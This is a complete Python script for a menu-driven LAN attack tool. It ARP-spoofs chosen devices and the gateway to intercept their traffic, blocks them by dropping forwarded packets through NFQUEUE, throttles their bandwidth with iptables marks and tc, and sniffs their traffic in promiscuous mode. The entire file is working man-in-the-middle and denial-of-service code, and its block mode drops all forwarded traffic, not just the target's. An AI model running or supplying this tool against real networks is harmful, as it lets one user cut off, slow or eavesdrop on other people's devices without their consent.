#!/usr/bin/env python3
import scapy.all as scapy
import os
import subprocess
import netifaces
import netfilterqueue
import threading
import sys
import time
from collections import deque, defaultdict
from termcolor import colored
from tqdm import tqdm

# -------------------------
# Utilities
# -------------------------
def has_root():
    return os.geteuid() == 0

def get_gateway_ip():
    try:
        return netifaces.gateways()["default"][netifaces.AF_INET][0]
    except Exception:
        print(colored("[!] Could not find default gateway.", "red")); sys.exit(1)

def get_default_interface():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

def get_subnet_cidr(iface):
    try:
        if_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
        addr, netmask = if_info['addr'], if_info['netmask']
        ip_parts = list(map(int, addr.split('.'))); mask_parts = list(map(int, netmask.split('.')))
        net_addr_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
        network_address = ".".join(net_addr_parts)
        prefix = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        return f"{network_address}/{prefix}"
    except Exception as e:
        print(colored(f"[!] Could not determine subnet. Error: {e}", "red")); sys.exit(1)

def discover_clients(ip_range, sweeps=3):
    found = {}
    print(colored(f"[+] Scanning network {ip_range}...", "yellow"))
    for _ in tqdm(range(sweeps), desc="ARP Sweep", unit="scan"):
        try:
            answered, _ = scapy.arping(ip_range, timeout=2, verbose=False)
            for _, rcv in answered: found[rcv.psrc] = rcv.hwsrc
        except Exception as e:
            print(colored(f"\n[!] ARP scan failed: {e}", "red"))
        time.sleep(0.2)
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]


# -------------------------
# Auto-enable IP Forwarding (Critical for MITM)
# -------------------------
def enable_ip_forwarding():
    """Enable IP forwarding so target devices don't lose internet during spoofing."""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                return
        print(colored("[+] Enabling IP forwarding...", "cyan"))
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
    except PermissionError:
        print(colored("[!] Failed to enable IP forwarding. Run with sudo.", "red"))
    except Exception as e:
        print(colored(f"[!] Error enabling IP forwarding: {e}", "red"))

def enable_promiscuous_mode(iface):
    """Enable promiscuous mode on interface for better packet capture."""
    try:
        result = subprocess.run(f"ip link show {iface} | grep -q PROMISC", shell=True)
        if result.returncode != 0:
            print(colored(f"[+] Enabling promiscuous mode on {iface}...", "cyan"))
            subprocess.run(f"ip link set {iface} promisc on", shell=True, check=True)
    except Exception as e:
        print(colored(f"[!] Failed to enable promiscuous mode on {iface}: {e}", "red"))

def ensure_interface_up(iface):
    """Ensure network interface is up. Returns True if successful."""
    try:
        for attempt in range(3):  # Try up to 3 times
            # Check if interface exists and is UP
            result = subprocess.run(f"ip link show {iface} 2>/dev/null | grep -q 'state UP'", shell=True)
            if result.returncode == 0:
                return True  # Already up

            # If interface exists but is DOWN, bring it UP
            result = subprocess.run(f"ip link show {iface} 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                print(colored(f"[+] Attempt {attempt+1}: Bringing up interface {iface}...", "cyan"))
                # Bring up with error ignored
                subprocess.run(f"ip link set {iface} up 2>/dev/null", shell=True)
                time.sleep(0.5)  # Let interface stabilize
                continue

            # Interface doesn't exist — try to create it (for ifb0)
            if iface == "ifb0":
                print(colored(f"[+] Attempt {attempt+1}: Creating and bringing up {iface}...", "cyan"))
                subprocess.run("modprobe ifb 2>/dev/null", shell=True)
                subprocess.run(f"ip link add {iface} type ifb 2>/dev/null", shell=True)
                subprocess.run(f"ip link set {iface} up 2>/dev/null", shell=True)
                time.sleep(0.5)
                continue

            # Other interfaces — can't create, give up
            print(colored(f"[!] Interface {iface} does not exist and cannot be created.", "red"))
            return False

        # After 3 attempts, final check
        result = subprocess.run(f"ip link show {iface} 2>/dev/null | grep -q 'state UP'", shell=True)
        if result.returncode == 0:
            return True
        else:
            print(colored(f"[!] Interface {iface} remains down after 3 attempts.", "red"))
            return False

    except Exception as e:
        print(colored(f"[!] Failed to bring up {iface}: {e}", "red"))
        return False

def debug_ifb0_state():
    """Optional: Debug current state of ifb0"""
    print(colored("\n[DEBUG] Checking ifb0 state...", "magenta"))
    subprocess.run("ip link show ifb0 2>&1 | cat", shell=True)
    result = subprocess.run("ip link show ifb0 2>/dev/null | grep -q 'state UP'", shell=True)
    if result.returncode == 0:
        print(colored("[DEBUG] ifb0 is UP", "green"))
    else:
        print(colored("[DEBUG] ifb0 is DOWN or does not exist", "red"))


# -------------------------
# ARP Spoofing Logic
# -------------------------
class ARPSpoofer:
    def __init__(self, target, gateway):
        self.target, self.gateway = target, gateway
        self.spoofing = threading.Event()

    def _send_spoof_packet(self, target_ip, target_mac, spoof_ip):
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=False)

    def _restore_arp(self):
        print(colored(f"[+] Restoring ARP for {self.target['ip']}...", "yellow"))
        gateway_mac, target_mac = scapy.getmacbyip(self.gateway['ip']), scapy.getmacbyip(self.target['ip'])
        if not gateway_mac or not target_mac: return
        p1 = scapy.ARP(op=2, pdst=self.target['ip'], hwdst=self.target['mac'], psrc=self.gateway['ip'], hwsrc=gateway_mac)
        p2 = scapy.ARP(op=2, pdst=self.gateway['ip'], hwdst=self.gateway['mac'], psrc=self.target['ip'], hwsrc=target_mac)
        for _ in range(4): scapy.send(p1, verbose=False); scapy.send(p2, verbose=False); time.sleep(0.5)

    def _spoof_loop(self):
        while not self.spoofing.is_set():
            self._send_spoof_packet(self.target["ip"], self.target["mac"], self.gateway["ip"])
            self._send_spoof_packet(self.gateway["ip"], self.gateway["mac"], self.target["ip"])
            time.sleep(0.5)  # More frequent spoofing for modern devices

    def start(self):
        self.spoofing.clear()
        threading.Thread(target=self._spoof_loop, daemon=True).start()

    def stop(self):
        self.spoofing.set()
        time.sleep(1)
        self._restore_arp()


# -------------------------
# Network Controller (Manages All Modes)
# -------------------------
class NetworkController:
    def __init__(self, iface):
        self.iface = iface
        self.spoofers = {}
        self.added_iptables_rules = []
        # TC Rate Limiting components
        self.active_tc_limits = {}
        self.ifb_device = "ifb0"
        self.ifb_is_setup = False
        # NetfilterQueue components (used only for blocking now)
        self.queue = None
        self.packet_buffer = deque()
        self.buffer_lock = threading.Lock()

    def _run_cmd(self, cmd):
        result = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if result.returncode != 0:
            pass  # Suppress noise, enable for debugging if needed

    # --- Methods for NFQUEUE (Block only) ---
    def _process_nfqueue_packet(self, packet):
        packet.drop()  # Block mode — just drop everything

    def _start_nfqueue_system(self):
        if self.queue: return
        self._cleanup_tc_all()  # Ensure TC is disabled before starting NFQUEUE
        rule = ["-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]
        subprocess.call(["iptables"] + rule)
        self.added_iptables_rules.append(rule)
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, self._process_nfqueue_packet)
        threading.Thread(target=self.queue.run, daemon=True).start()

    def _cleanup_nfqueue_system(self):
        if self.queue:
            self.queue.unbind()
            self.queue = None

    # --- Methods for TC Rate Limiting ---
    def _setup_ifb(self):
        if self.ifb_is_setup: return
        self._cleanup_nfqueue_system()
        print(colored(f"[+] Setting up IFB device ({self.ifb_device}) for download shaping...", "cyan"))
        self._run_cmd("modprobe ifb")
        self._run_cmd(f"ip link add {self.ifb_device} type ifb 2>/dev/null || true")
        self._run_cmd(f"ip link set dev {self.ifb_device} up")
        self._run_cmd(f"tc qdisc del dev {self.iface} ingress 2>/dev/null || true")
        self._run_cmd(f"tc qdisc add dev {self.iface} ingress")
        self._run_cmd(f"tc filter add dev {self.iface} parent ffff: protocol ip u32 match u32 0 0 action mirred egress redirect dev {self.ifb_device}")
        self.ifb_is_setup = True
        
    def _cleanup_ifb(self):
        if not self.ifb_is_setup: return
        self._run_cmd(f"tc qdisc del dev {self.iface} ingress 2>/dev/null || true")
        self._run_cmd(f"ip link set dev {self.ifb_device} down 2>/dev/null || true")
        self.ifb_is_setup = False
    
    def _cleanup_tc_all(self):
        for ip in list(self.active_tc_limits.keys()):
            self.remove_bandwidth_limit(ip)
        self._cleanup_ifb()
        self._run_cmd(f"tc qdisc del dev {self.iface} root 2>/dev/null || true")
        self._run_cmd(f"tc qdisc del dev {self.ifb_device} root 2>/dev/null || true")

    # --- Public Methods for Main Menu ---
    def restore_all(self):
        print(colored("\n[+] Restoring network configuration...", "yellow"))
        for spoofer in self.spoofers.values():
            spoofer.stop()
        self.spoofers.clear()
        self._cleanup_nfqueue_system()
        self._cleanup_tc_all()
        for rule in reversed(self.added_iptables_rules):
            table = "filter"
            if rule[0] == "-t":
                table = rule[1]
                delete_rule = ["-t", table, "-D"] + rule[2:]
            else:
                delete_rule = ["-D"] + rule[1:]
            subprocess.run(["iptables"] + delete_rule, stderr=subprocess.DEVNULL)
        self.added_iptables_rules.clear()
        print(colored("[+] Network restored.", "green"))

    def start_spoofing(self, target, gateway):
        if target["ip"] not in self.spoofers:
            spoofer = ARPSpoofer(target, gateway)
            self.spoofers[target["ip"]] = spoofer
            spoofer.start()
            print(colored(f"[+] Started ARP spoofing for {target['ip']}", "green"))

    def block_target(self, target, gateway):
        self.start_spoofing(target, gateway)
        self._cleanup_tc_all()          # Ensure TC is off
        self._cleanup_nfqueue_system()  # Clean start
        self._start_nfqueue_system()
        print(colored(f"[+] Blocking is now active for {target['ip']}.", "red"))

    def set_bandwidth_limit(self, target, gateway, down_kbit, up_kbit):
        self.start_spoofing(target, gateway)
        ip = target['ip']
        mark = str((hash(ip) % 200) + 50)  # Unique mark per IP

        up_rate, down_rate = f"{up_kbit}kbit", f"{down_kbit}kbit"

        # ==================== UPLOAD (egress on main interface) ====================
        # Ensure root qdisc exists — create with default class 10 (unlimited)
        result = subprocess.run(f"tc qdisc show dev {self.iface} | grep -q 'qdisc htb 1:'", shell=True)
        if result.returncode != 0:
            self._run_cmd(f"tc qdisc add dev {self.iface} root handle 1: htb default 10")
            # Add default class 10 with high rate (unlimited fallback)
            self._run_cmd(f"tc class add dev {self.iface} parent 1: classid 1:10 htb rate 1000mbit ceil 1000mbit")

        # Add throttled class for this IP
        self._run_cmd(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null || true")
        self._run_cmd(f"tc class add dev {self.iface} parent 1: classid 1:{mark} htb rate {up_rate} ceil {up_rate}")

        # Remove old filter, add new one
        self._run_cmd(f"tc filter del dev {self.iface} parent 1: protocol ip handle {mark} fw 2>/dev/null || true")
        self._run_cmd(f"tc filter add dev {self.iface} parent 1: protocol ip handle {mark} fw classid 1:{mark}")

        # Add iptables rule to mark upload packets FROM this IP
        rule_up = ["-t", "mangle", "-I", "POSTROUTING", "-s", ip, "-j", "MARK", "--set-mark", mark]
        subprocess.call(["iptables"] + rule_up)
        self.added_iptables_rules.append(rule_up)

        # ==================== DOWNLOAD (ingress via IFB) ====================
        self._setup_ifb()  # Make sure IFB is ready

        # Ensure root qdisc exists on IFB — create with default class 10
        result = subprocess.run(f"tc qdisc show dev {self.ifb_device} | grep -q 'qdisc htb 1:'", shell=True)
        if result.returncode != 0:
            self._run_cmd(f"tc qdisc add dev {self.ifb_device} root handle 1: htb default 10")
            # Add default class 10 with high rate (unlimited fallback)
            self._run_cmd(f"tc class add dev {self.ifb_device} parent 1: classid 1:10 htb rate 1000mbit ceil 1000mbit")

        # Add throttled class for this IP
        self._run_cmd(f"tc class del dev {self.ifb_device} parent 1: classid 1:{mark} 2>/dev/null || true")
        self._run_cmd(f"tc class add dev {self.ifb_device} parent 1: classid 1:{mark} htb rate {down_rate} ceil {down_rate}")

        # Remove old filter, add new one
        self._run_cmd(f"tc filter del dev {self.ifb_device} parent 1: protocol ip handle {mark} fw 2>/dev/null || true")
        self._run_cmd(f"tc filter add dev {self.ifb_device} parent 1: protocol ip handle {mark} fw classid 1:{mark}")

        # Add iptables rule to mark download packets TO this IP
        rule_down = ["-t", "mangle", "-I", "PREROUTING", "-d", ip, "-j", "MARK", "--set-mark", mark]
        subprocess.call(["iptables"] + rule_down)
        self.added_iptables_rules.append(rule_down)

        self.active_tc_limits[ip] = (down_kbit, up_kbit)
        print(colored(f"[+] Bandwidth limit set for {ip}: DOWN {down_kbit/8:.1f}KB/s, UP {up_kbit/8:.1f}KB/s", "green"))
    def remove_bandwidth_limit(self, ip):
        if ip not in self.active_tc_limits: return
        mark = str((hash(ip) % 200) + 50)
        print(colored(f"[+] Removing rate limit for {ip}", "yellow"))

        # Remove filters and classes
        self._run_cmd(f"tc filter del dev {self.iface} parent 1: protocol ip handle {mark} fw 2>/dev/null || true")
        self._run_cmd(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null || true")
        self._run_cmd(f"tc filter del dev {self.ifb_device} parent 1: protocol ip handle {mark} fw 2>/dev/null || true")
        self._run_cmd(f"tc class del dev {self.ifb_device} parent 1: classid 1:{mark} 2>/dev/null || true")

        # Remove iptables rules
        mark_val = mark
        new_rules = []
        for rule in self.added_iptables_rules:
            skip = False
            if ("-s" in rule and ip == rule[rule.index("-s")+1] and "--set-mark" in rule and mark_val == rule[rule.index("--set-mark")+1]) or \
               ("-d" in rule and ip == rule[rule.index("-d")+1] and "--set-mark" in rule and mark_val == rule[rule.index("--set-mark")+1]):
                table = rule[1] if rule[0] == "-t" else "filter"
                delete_rule = ["-t", table, "-D"] + rule[2:] if rule[0] == "-t" else ["-D"] + rule[1:]
                subprocess.run(["iptables"] + delete_rule, stderr=subprocess.DEVNULL)
                skip = True
            if not skip:
                new_rules.append(rule)
        self.added_iptables_rules = new_rules

        del self.active_tc_limits[ip]
        print(colored(f"[+] Removed limit for {ip}. Traffic restored to normal.", "green"))

# -------------------------
# Bandwidth Monitoring
# -------------------------
class BandwidthMonitor:
    def __init__(self, target_ips, iface=None):
        self.target_ips = target_ips
        self.iface = iface
        self.ifb_iface = "ifb0"
        self.bytes_up = defaultdict(int)
        self.bytes_down = defaultdict(int)
        self.running = threading.Event()
        self._lock = threading.Lock()

    def start(self):
        self.running.clear()
        print(colored(f"[+] Bandwidth monitor started on interface: {self.iface}", "green"))

        # Start sniffing on main interface (always)
        threading.Thread(target=self._sniff, args=(self.iface,), daemon=True).start()

        # Small delay to let system settle (especially after TC setup)
        time.sleep(0.3)

        # Only start sniffing on ifb0 if it's up and available
        if ensure_interface_up(self.ifb_iface):
            print(colored(f"[+] Also monitoring shaped download traffic on {self.ifb_iface}", "green"))
            threading.Thread(target=self._sniff, args=(self.ifb_iface,), daemon=True).start()
        else:
            print(colored(f"[!] Skipping {self.ifb_iface} — interface is down or does not exist.", "yellow"))

        threading.Thread(target=self._display, daemon=True).start()

    def _process_packet(self, pkt):
        if scapy.IP in pkt:
            size = len(pkt)
            with self._lock:
                if pkt[scapy.IP].src in self.target_ips:
                    self.bytes_up[pkt[scapy.IP].src] += size
                if pkt[scapy.IP].dst in self.target_ips:
                    self.bytes_down[pkt[scapy.IP].dst] += size

    def _sniff(self, iface):
        if not self.target_ips:
            return

        # Skip if interface is down (especially for ifb0)
        try:
            result = subprocess.run(f"ip link show {iface} | grep -q 'state UP'", shell=True)
            if result.returncode != 0:
                print(colored(f"[!] Interface {iface} is down. Skipping sniffing.", "yellow"))
                return
        except:
            pass

        clauses = [f"host {ip}" for ip in self.target_ips]
        bpf_filter = " or ".join(clauses) if clauses else "false"
        print(colored(f"[+] Sniffing on {iface} with filter: '{bpf_filter}'", "cyan"))

        try:
            scapy.sniff(
                iface=iface,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: self.running.is_set(),
                filter=bpf_filter,
                timeout=1,
                promisc=True
            )
        except Exception as e:
            if "Network is down" in str(e) or "Errno 100" in str(e):
                print(colored(f"[!] Interface {iface} went down. Stopping sniff thread.", "yellow"))
            else:
                print(colored(f"[!] Sniffing error on {iface}: {e}", "red"))

    def _display(self):
        last_time = time.time()
        while not self.running.is_set():
            time.sleep(2)
            now = time.time()
            elapsed = now - last_time
            if elapsed <= 0:
                continue

            title = "--- Bandwidth Usage (KB/s) ---"
            if len(self.target_ips) > 5:
                title += f" [Monitoring {len(self.target_ips)} devices]"
            print(colored(f"\n{title}", "yellow"))

            with self._lock:
                any_output = False
                displayed = 0
                for ip in self.target_ips:
                    up_kb = (self.bytes_up[ip] / 1024) / elapsed
                    down_kb = (self.bytes_down[ip] / 1024) / elapsed
                    print(f"{ip.ljust(15)} | UP: {up_kb:.2f} KB/s | DOWN: {down_kb:.2f} KB/s")
                    self.bytes_up[ip], self.bytes_down[ip] = 0, 0
                    any_output = True
                    displayed += 1
                    if displayed >= 20:
                        print(colored("... (showing top 20)", "blue"))
                        break
                if not any_output:
                    print("No traffic captured.")
            last_time = now
        print(colored("[+] Bandwidth monitor stopped.", "yellow"))

    def stop(self):
        self.running.set()


# -------------------------
# Main Application
# -------------------------
def main():
    if not has_root():
        print(colored("[-] Run with sudo.", "red"))
        sys.exit(1)

    default_iface = get_default_interface()
    gateway_ip = get_gateway_ip()
    subnet = get_subnet_cidr(default_iface)
    gateway_mac = scapy.getmacbyip(gateway_ip)
    
    if not gateway_mac:
        print(colored(f"[!] Could not resolve MAC for gateway {gateway_ip}", "red"))
        sys.exit(1)
    
    print(colored("--- NetControl Tool (Bandwidth Control + Monitor) ---", "yellow", attrs=["bold"]))
    print(f"[+] Interface: {default_iface}, Gateway: {gateway_ip}, Subnet: {subnet}")

    # ✅ AUTO-ENABLE SYSTEM SETTINGS
    enable_ip_forwarding()
    enable_promiscuous_mode(default_iface)
    
    # Pre-create ifb0 so monitor can use it even before TC is applied
    subprocess.run("modprobe ifb", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run(f"ip link add ifb0 type ifb 2>/dev/null || true", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("ip link set ifb0 up 2>/dev/null || true", shell=True, stderr=subprocess.DEVNULL)

    # OPTIONAL DEBUG — REMOVE IN PRODUCTION IF NOT NEEDED
    debug_ifb0_state()
        
    gateway = {"ip": gateway_ip, "mac": gateway_mac}
    controller = NetworkController(default_iface)
    monitor, clients = None, []

    try:
        while True:
            print(colored("\n--- Menu ---", "yellow", attrs=["bold"]))
            print("1. Scan for Devices")
            print("2. Block Devices")
            print("3. Set Rate Limit (e.g., 100 KB/s)")
            print("5. Toggle Bandwidth Monitor (All scanned devices if none targeted)")
            print("6. Restore Network")
            print("7. Exit")
            
            choice = input(colored("Choose option: ", "green")).strip()

            if choice == "1":
                clients = discover_clients(subnet, sweeps=3)
                clients = [c for c in clients if c["ip"] != gateway_ip]  # Exclude gateway
                if clients:
                    print(colored("Discovered devices:", "cyan"))
                    for i, client in enumerate(clients, 1):
                        print(f"  [{i}] {client['ip'].ljust(15)} {client['mac']}")
                else:
                    print(colored("No other devices found.", "red"))

            elif choice == "2":
                if not clients:
                    print(colored("Scan first.", "red"))
                    continue
                try:
                    indices = [int(i.strip())-1 for i in input(colored("Targets to block (e.g., 1,3): ", "red", attrs=["bold"])).split(",")]
                    for idx in indices:
                        if 0 <= idx < len(clients):
                            controller.block_target(clients[idx], gateway)
                        else:
                            print(colored(f"Invalid index: {idx+1}", "red"))
                except (ValueError, IndexError):
                    print(colored("Invalid selection.", "red"))

            elif choice == "3": # Rate Limit
                if not clients:
                    print(colored("Scan first.", "red"))
                    continue
                try:
                    idx = int(input(colored("Client to limit (number): ", "cyan"))) - 1
                    if not (0 <= idx < len(clients)):
                        print(colored("Invalid client number.", "red"))
                        continue
                    target = clients[idx]
                    rate_str = input(colored(f"Limit for {target['ip']} in KB/s (DOWN/UP), e.g., 100/50: ", "cyan"))
                    parts = rate_str.split('/')
                    if len(parts) != 2:
                        print(colored("Format: down/up in KB/s, e.g., 100/50", "red"))
                        continue
                    down_kb, up_kb = map(int, parts)
                    if down_kb <= 0 and up_kb <= 0:
                        controller.remove_bandwidth_limit(target['ip'])
                        print(colored(f"[+] Removed bandwidth limit for {target['ip']}", "green"))
                    else:
                        print(colored(f"[+] Applying limit: {down_kb}KB/s Down, {up_kb}KB/s Up...", "cyan"))
                        controller.set_bandwidth_limit(target, gateway, down_kb * 8, up_kb * 8)
                except ValueError:
                    print(colored("Invalid format. Use whole numbers like 100/50.", "red"))

            elif choice == "5": # Monitor — NOW MONITORS ALL SCANNED DEVICES IF NONE TARGETED
                if monitor and not monitor.running.is_set():
                    monitor.stop()
                    monitor = None
                    print(colored("[+] Stopped bandwidth monitor.", "yellow"))
                else:
                    # Build list of IPs to monitor
                    target_ips = list(controller.spoofers.keys())  # Currently spoofed/throttled

                    # If no targets, use all scanned clients (excluding gateway)
                    if not target_ips and clients:
                        target_ips = [c["ip"] for c in clients if c["ip"] != gateway_ip]
                        print(colored(f"[i] No active targets — monitoring all {len(target_ips)} scanned devices.", "blue"))
                    elif not target_ips:
                        print(colored("No devices to monitor. Scan first or target a device.", "red"))
                        continue

                    # Start monitor
                    monitor = BandwidthMonitor(target_ips, default_iface)
                    monitor.start()
                    display_list = ', '.join(target_ips[:5]) + ('...' if len(target_ips) > 5 else '')
                    print(colored(f"[+] Monitoring {len(target_ips)} device(s): {display_list}", "green"))
            
            elif choice == "6": # Restore
                controller.restore_all()
                if monitor:
                    monitor.stop()
                    monitor = None

            elif choice == "7": # Exit
                break

            else:
                print(colored("Invalid choice.", "red"))

    except KeyboardInterrupt:
        print(colored("\n[!] Ctrl+C detected. Shutting down...", "red"))
    finally:
        if 'controller' in locals():
            controller.restore_all()
        if 'monitor' in locals() and monitor:
            monitor.stop()

if __name__ == "__main__":
    main()